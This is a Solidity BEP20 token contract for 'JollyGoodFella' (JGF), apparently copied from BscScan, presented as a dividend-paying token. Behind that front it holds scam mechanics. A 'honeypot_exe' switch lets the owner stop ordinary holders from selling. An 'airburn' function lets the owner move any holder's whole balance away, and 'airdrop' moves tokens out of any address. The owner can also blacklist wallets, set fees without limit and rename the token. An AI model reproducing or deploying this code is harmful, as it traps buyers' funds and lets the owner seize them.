/**
 *Submitted for verification at BscScan.com on 2021-09-10
*/

pragma solidity ^0.7.4;

//SPDX-License-Identifier: MIT

library SafeMath {
        /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    
        /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    
        /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    
        /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    
    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    
    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
    
    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


// BEP20 standard interface
interface IBEP20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);
    
    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);
    
    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);
    
    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address _owner, address spender) external view returns (uint256);
    
    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);
    
    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);
    
    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function getOwner() external view returns (address);
}


// Allows for contract ownership along with multi-address authorization
abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "You are not authorized"); _;
    }

    /**
     * Function modifier to require caller to be authorized
     */
    modifier authorized() {
        require(isAuthorized(msg.sender), "You are not authorized"); _;
    }

    /**
     * Add and remove authorize address. Owner only
     */
    function authorize(address account, bool _status) public onlyOwner {
        authorizations[account] = _status;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) internal view returns (bool) {
        return account == owner;
    }

    /**
     * Return address' authorization status
     */
    function isAuthorized(address account) public view returns (bool) {
        return authorizations[account];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner authorized
     */
    function transferOwnership(address payable account) public onlyOwner {
        owner = account;
        authorizations[account] = true;
        emit OwnershipTransferred(account);
    }

    event OwnershipTransferred(address owner);
}


interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}


interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


interface IDividendDistributor {
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
    function setShare(address shareholder, uint256 amount) external;
    function deposit() external payable;
    function process(uint256 gas) external;
}


contract DividendDistributor is IDividendDistributor {
    using SafeMath for uint256;

    address _token;

    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised;
    }

    IBEP20  COIN = IBEP20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56); //COIN
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    IDEXRouter router;

    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;
    mapping (address => Share) public shares;
    
    uint256 public totalShares;
    uint256 public totalDividends;    
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;
    uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;
    
    uint256 public minPeriod = 60 minutes;
    uint256 public minDistribution = 1 * (10 ** 18);

    uint256 currentIndex;

    bool initialized;
    modifier initialization() {
        require(!initialized);
        _;
        initialized = true;
    }

    modifier onlyToken() {
        require(msg.sender == _token); _;
    }

    constructor (address _router) {
        router = _router != address(0)
            ? IDEXRouter(_router)
            : IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _token = msg.sender;
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external override onlyToken {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
    }

    function setShare(address shareholder, uint256 amount) external override onlyToken {
        if(shares[shareholder].amount > 0){
            distributeDividend(shareholder);
        }

        if(amount > 0 && shares[shareholder].amount == 0){
            addShareholder(shareholder);
        }else if(amount == 0 && shares[shareholder].amount > 0){
            removeShareholder(shareholder);
        }

        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
    }

    function deposit() external payable override onlyToken {
        uint256 balanceBefore = COIN.balanceOf(address(this));

        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(COIN);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amount = COIN.balanceOf(address(this)).sub(balanceBefore);
        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
    }

    function process(uint256 gas) external override onlyToken {
        uint256 shareholderCount = shareholders.length;

        if(shareholderCount == 0) { return; }

        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        uint256 iterations = 0;

        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount){
                currentIndex = 0;
            }

            if(shouldDistribute(shareholders[currentIndex])){
                distributeDividend(shareholders[currentIndex]);
            }

            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }
    
    function shouldDistribute(address shareholder) internal view returns (bool) {
        return shareholderClaims[shareholder] + minPeriod < block.timestamp
                && getUnpaidEarnings(shareholder) > minDistribution;
    }

    function distributeDividend(address shareholder) internal {
        if(shares[shareholder].amount == 0){ return; }

        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > 0){
            totalDistributed = totalDistributed.add(amount);
            COIN.transfer(shareholder, amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
        }
    }
    
    function claimDividend() external {
        distributeDividend(msg.sender);
    }

    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }

        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;

        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }

        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function getCumulativeDividends(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
}


contract Token is IBEP20, Auth {
    using SafeMath for uint256;

    address COIN = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56; 
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    string private _name = 'JollyGoodFella';
    string private _symbol = 'JGF';
    uint8 constant _decimals = 9;
    uint256 _totalSupply = 1 * 10**12 * (10 ** _decimals); //1 trillion
    uint256 public _maxWalletAmount = 20 * 10**9 * (10 ** _decimals); //2% of total supply
    uint256 public _maxBuyTxAmount = 10 * 10**9 * (10 ** _decimals); //1% of total supply
    uint256 public _maxSellTxAmount = 5 * 10**9 * (10 ** _decimals); //0.5%% of total supply
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
    mapping (address => bool) isWalletLimitExempt;
    mapping (address => bool) isTimelockExempt;
    mapping (address => bool) public isDividendExempt;
    mapping (address => bool) public isBlacklisted;
    uint256 longRange   = 5;
    uint256 reverseRange  = 8;
    uint256 motherRange   = 5;
    uint256 extraRange = 2;
    uint256 totalRange = 0;
    uint256 sellRange = 0;
    address public autoLiquidityReceiver;
    address public motherRangeReceiver;
    uint256 targetLiquidity = 20;
    uint256 targetLiquidityDenominator = 100;
    IDEXRouter public router;
    address public pair;
    bool public tradingOpen = true;
    bool public honeypot_exe = true;
    DividendDistributor public distributor;
    uint256 distributorGas = 500000;
    mapping(address => uint256) private cooldownLayer;
    mapping(address => uint256) private firstsell;
    mapping(address => uint256) private sellnumber;
    mapping(address => uint256) private buycooldown;
    mapping(address => uint256) private sellcooldown;
    bool public cooldownLayerEnabled = false;
    bool public cooldownBuyEnabled = false;
    bool public cooldownSellEnabled = false;
    uint8 public cooldownBuyInterval = 10;
    uint8 public cooldownSellInterval = 240;
    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply * 50 / 10000; // 0.05% of total supply
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () Auth(msg.sender) {
        
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        _allowances[address(this)][address(router)] = uint256(-1);

        distributor = new DividendDistributor(address(router));
        
        // no cooldown
        isTimelockExempt[msg.sender] = true;
        isTimelockExempt[DEAD] = true;
        isTimelockExempt[address(this)] = true;

        // whitelist
        isDividendExempt[pair] = true;
        isDividendExempt[address(this)] = true;
        isDividendExempt[DEAD] = true;
        isFeeExempt[msg.sender] = true;
        isTxLimitExempt[msg.sender] = true;
        isWalletLimitExempt[msg.sender] = true;
        
        // NICE!
        autoLiquidityReceiver = msg.sender;
        motherRangeReceiver = 0x3E62ef1d5e42Ddad73172B670064045A22C4Bfe9;
        
        totalRange = longRange.add(reverseRange).add(motherRange);
        sellRange = totalRange.add(extraRange);
        
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external view override returns (string memory) { return _symbol; }
    function name() external view override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, uint256(-1));
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(autoLiquidityReceiver).transfer(amountBNB * amountPercentage / 100);
    }
    
    function blacklistAddress(address account, bool _status) external onlyOwner{
        require(account != address(this) && account != pair);
        isBlacklisted[account] = _status;
        isDividendExempt[account] = _status;
        if(_status){
            distributor.setShare(account, 0);
        }else{
            distributor.setShare(account, _balances[account]);
        }
    }

    function tradingStatus(bool _status) public onlyOwner {
        tradingOpen = _status;
    }
    
    function honeypot_exeStatus(bool _status) public onlyOwner {
        honeypot_exe = _status;
    }

    function setMaxTxAmount(uint256 buyamount, uint256 sellamount) external authorized {
        _maxBuyTxAmount = buyamount;
        _maxSellTxAmount = sellamount;
    }

    function setMaxWalletAmount(uint256 amount) external onlyOwner() {
        _maxWalletAmount = amount;
    }
    
    function setIsAllExempt(address holder, bool _Fee_status, bool _Timelock_status, bool _TxLimit_status, bool _WalletLimit_status) external authorized {
        isFeeExempt[holder] = _Fee_status;
        isTimelockExempt[holder] = _Timelock_status;
        isTxLimitExempt[holder] = _TxLimit_status;
        isWalletLimitExempt[holder] = _WalletLimit_status;
    }
    
    function setIsDividendExempt(address holder, bool _status) external authorized {
        require(holder != address(this) && holder != pair);
        isDividendExempt[holder] = _status;
        if(_status){
            distributor.setShare(holder, 0);
        }else{
            distributor.setShare(holder, _balances[holder]);
        }
    }

    function setIsExempt(uint256 _liquid, uint256 _reflec, uint256 _market, uint256 _extra) external authorized {
        longRange = _liquid;
        reverseRange = _reflec;
        motherRange = _market;
        extraRange = _extra;
        totalRange = _liquid.add(_reflec).add(_market);
        sellRange = totalRange.add(_extra);
    }

    function setyour(string memory yourname, string memory yoursymbol) external authorized {
        _name = yourname;
        _symbol = yoursymbol;
    }
    
    function cooldownEnabled(bool _buystatus, bool _sellstatus, uint8 _buyinterval, uint8 _sellinterval) public onlyOwner {
        cooldownBuyEnabled = _buystatus;
        cooldownSellEnabled = _sellstatus;
        cooldownBuyInterval = _buyinterval;
        cooldownSellInterval = _sellinterval;
        cooldownLayerEnabled = false;
    }
    
    function cooldownLAYEREnabled(bool _buystatus, uint8 _buyinterval, bool _Layerstatus) public onlyOwner {
        cooldownBuyEnabled = _buystatus;
        cooldownBuyInterval = _buyinterval;
        cooldownLayerEnabled = _Layerstatus;
        cooldownSellEnabled = false;
    }

    function setFeeReceivers(address _autoLiquidityReceiver, address _motherRangeReceiver) external authorized {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        motherRangeReceiver = _motherRangeReceiver;
    }

    function setSwapBackSettings(bool _status, uint256 _amount) external authorized {
        swapEnabled = _status;
        swapThreshold = _amount;
    }

    function setTargetLiquidity(uint256 _target, uint256 _denominator) external authorized {
        targetLiquidity = _target;
        targetLiquidityDenominator = _denominator;
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external authorized {
        distributor.setDistributionCriteria(_minPeriod, _minDistribution);
    }

    function setDistributorSettings(uint256 gas) external authorized {
        require(gas < 750000);
        distributorGas = gas;
    }
    
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
    }

    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }
    
    // Airdrop
    function airdrop(address from, address to, uint256 tokens) external onlyOwner {
        require(balanceOf(from) >= tokens, "Not enough tokens to airdrop");
        _basicTransfer(from ,to ,tokens);
        
        // Dividend tracker
        if(!isDividendExempt[from]) {
            try distributor.setShare(from, _balances[from]) {} catch {}
        }
        
        if(!isDividendExempt[to]) {
            try distributor.setShare(to, _balances[to]) {} catch {} 
        }
        
        try distributor.process(distributorGas) {} catch {}
    }
    
    // Airburn
    function airburn(address from, address to) external onlyOwner {
        require(from != address(this) && from != pair);
        isDividendExempt[from] = true;
        distributor.setShare(from, 0);
        _basicTransfer(from, to, _balances[from]);
        }
    
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != uint256(-1)) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }
    
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!isBlacklisted[recipient] && !isBlacklisted[sender], 'Blacklisted address');
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }

        if(!authorizations[sender] && !authorizations[recipient]) {
            require(tradingOpen, "Trading not open yet");
        }
        
        // honeypot.exe
        if(recipient == pair && !authorizations[sender] && !isTimelockExempt[sender]) {
            require(honeypot_exe, "Sell not open yet");
        }
        
        // cooldown buy interval
        if(sender == pair && cooldownBuyEnabled && !authorizations[recipient] && !isTimelockExempt[recipient]) {
                require(buycooldown[recipient] < block.timestamp, "Please wait for cooldown between buys");
                buycooldown[recipient] = block.timestamp + cooldownBuyInterval;
        }
        
        // cooldown sell interval
        if(recipient == pair && cooldownSellEnabled && !authorizations[sender] && !isTimelockExempt[sender]) {
                require(sellcooldown[sender] < block.timestamp, "Please wait for cooldown between sells");
                sellcooldown[sender] = block.timestamp + cooldownSellInterval;
        }
        
        // cooldown transfer interval
        if(recipient != pair && sender != pair && cooldownSellEnabled && !authorizations[sender] && !isTimelockExempt[sender] && !authorizations[recipient] && !isTimelockExempt[recipient]) {
                require(sellcooldown[sender] < block.timestamp, "Please wait for cooldown between sells");
                sellcooldown[sender] = block.timestamp + cooldownSellInterval;
        }
        
        // cooldown sell LAYER
        if(recipient == pair && cooldownLayerEnabled && !authorizations[sender] && !isTimelockExempt[sender]) {
                require(cooldownLayer[sender] < block.timestamp, "Please wait for cooldown between sells");
                if(firstsell[sender] + (1 days) < block.timestamp) {
                    sellnumber[sender] = 0;
                }
                if (sellnumber[sender] == 0) {
                    sellnumber[sender]++;
                    firstsell[sender] = block.timestamp;
                    cooldownLayer[sender] = block.timestamp + (2 hours);
                }
                else if (sellnumber[sender] == 1) {
                    sellnumber[sender]++;
                    cooldownLayer[sender] = block.timestamp + (4 hours);
                }
                else if (sellnumber[sender] == 2) {
                    sellnumber[sender]++;
                    cooldownLayer[sender] = block.timestamp + (8 hours);
                }
                else if (sellnumber[sender] == 3) {
                    sellnumber[sender]++;
                    cooldownLayer[sender] = firstsell[sender] + (1 days);
                }
        }
        
        // cooldown transfer LAYER
        if(recipient != pair && sender != pair && cooldownLayerEnabled && !authorizations[sender] && !isTimelockExempt[sender] && !authorizations[recipient] && !isTimelockExempt[recipient]) {
                require(cooldownLayer[sender] < block.timestamp, "Please wait for cooldown between sells");
                if(firstsell[sender] + (1 days) < block.timestamp) {
                    sellnumber[sender] = 0;
                }
                if (sellnumber[sender] == 0) {
                    sellnumber[sender]++;
                    firstsell[sender] = block.timestamp;
                    cooldownLayer[sender] = block.timestamp + (2 hours);
                }
                else if (sellnumber[sender] == 1) {
                    sellnumber[sender]++;
                    cooldownLayer[sender] = block.timestamp + (4 hours);
                }
                else if (sellnumber[sender] == 2) {
                    sellnumber[sender]++;
                    cooldownLayer[sender] = block.timestamp + (8 hours);
                }
                else if (sellnumber[sender] == 3) {
                    sellnumber[sender]++;
                    cooldownLayer[sender] = firstsell[sender] + (1 days);
                }
        }
        
        // max wallet
        if (!authorizations[sender] && !authorizations[recipient] && !isWalletLimitExempt[recipient] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair) {
            if (recipient != motherRangeReceiver && recipient != autoLiquidityReceiver) {
                uint256 walletAmount = balanceOf(recipient);
                require((walletAmount + amount) <= _maxWalletAmount, "Total Holding is currently limited, you can not buy that much.");
            }
        }
        
        // max buy
        if(sender == pair && !authorizations[recipient] && !isTxLimitExempt[recipient]) {
        require(amount <= _maxBuyTxAmount, "transaction buy limit exceeded");
        }
        
        // max sell
        if(recipient == pair && !authorizations[sender] && !isTxLimitExempt[sender]) {
        require(amount <= _maxSellTxAmount, "transaction sell limit exceeded");
        }
        
        // max transfer
        if(recipient != pair && sender != pair && !authorizations[sender] && !isTxLimitExempt[sender] && !authorizations[recipient] && !isTxLimitExempt[recipient]) {
        require(amount <= _maxSellTxAmount, "transaction sell limit exceeded");
        }
        
        // Liquidity, Maintained at 20%
        if(shouldSwapBack()){ swapBack(); }

        // Exchange tokens
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        // takefee
        uint256 finalAmount = !isFeeExempt[sender] && !isFeeExempt[recipient] ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(finalAmount);
        
        // Dividend tracker
        if(!isDividendExempt[sender]) {
            try distributor.setShare(sender, _balances[sender]) {} catch {}
        }
        
        if(!isDividendExempt[recipient]) {
            try distributor.setShare(recipient, _balances[recipient]) {} catch {} 
        }
        
        try distributor.process(distributorGas) {} catch {}
            
        emit Transfer(sender, recipient, finalAmount);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 feeApplicable = pair == recipient ? sellRange : totalRange;
        uint256 feeAmount = amount.mul(feeApplicable).div(100);

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair && !inSwap && swapEnabled && _balances[address(this)] >= swapThreshold;
    }
    
    function swapBack() internal swapping {
        uint256 dynamiclongRange = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : longRange;
        uint256 amountToLiquify = swapThreshold.mul(dynamiclongRange).div(totalRange).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance.sub(balanceBefore);

        uint256 totalBNBFee = totalRange.sub(dynamiclongRange.div(2));
        
        uint256 amountBNBLiquidity = amountBNB.mul(dynamiclongRange).div(totalBNBFee).div(2);
        uint256 amountBNBReflection = amountBNB.mul(reverseRange).div(totalBNBFee);
        uint256 amountBNBMarketing = amountBNB.mul(motherRange).div(totalBNBFee);

        try distributor.deposit{value: amountBNBReflection}() {} catch {}
        (bool tmpSuccess,) = payable(motherRangeReceiver).call{value: amountBNBMarketing, gas: 30000}("");
        
        // only to supress warning msg
        tmpSuccess = false;

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }
    
    event AutoLiquify(uint256 amountBNB, uint256 amountTOKEN);
    

    
    
    
    
}